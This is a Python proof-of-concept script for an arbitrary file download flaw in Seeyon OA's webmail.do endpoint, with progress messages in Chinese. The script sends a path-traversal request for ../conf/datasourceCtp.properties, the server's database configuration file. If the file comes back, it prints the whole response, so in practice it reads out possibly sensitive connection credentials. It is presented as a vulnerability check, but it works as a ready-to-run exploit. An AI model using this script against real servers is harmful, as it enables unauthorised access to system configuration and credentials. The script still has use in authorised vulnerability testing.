import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    vuln_url = target_url + "seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        print(now_time() + " [INFO]     正在检测致远OA webmail.do 任意文件下载漏洞")
        # print(now_time() + " [INFO]     正在请求: {}".format(vuln_url), style='bold blue')
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print(now_time() + ' [SUCCESS]  目标 {} 存在致远OA webmail.do 任意文件下载漏洞, 响应为: \n\n{}'.format(
                vuln_url, response.text))
        else:
            print(now_time() + ' [WARNING]  不存在致远OA webmail.do 任意文件下载漏洞')
    except:
        print(now_time() + ' [ERROR]    目标可能无法连接')
